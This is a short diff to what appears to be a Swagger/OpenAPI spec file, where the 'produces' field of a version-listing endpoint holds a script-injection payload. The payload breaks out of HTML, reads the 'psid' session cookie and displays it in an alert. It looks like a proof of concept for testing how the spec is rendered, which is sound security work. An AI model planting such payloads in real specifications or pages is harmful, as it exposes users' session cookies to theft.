@@ -10,7 +10,7 @@
         "operationId": "listVersionsv2",
         "summary": "List API versions",
         "produces": [
-          "\"><script>function getCookie(name) {  const value = `; ${document.cookie}`;  const parts = value.split(`; ${name}=`);  if (parts.length === 2) return parts.pop().split(';').shift();}alert('Сессия терминала: ' + getCookie('psid') + ', отправляем на левый сервер?');</script>"
+          "\"><script>function getCookie(name) {  const value = `; ${document.cookie}`;  const parts = value.split(`; ${name}=`);  if (parts.length === 2) return parts.pop().split(';').shift();}alert('Сессия: ' + getCookie('psid') + ', отправляем на левый сервер?');</script>"
         ],
         "responses": {
           "200": {
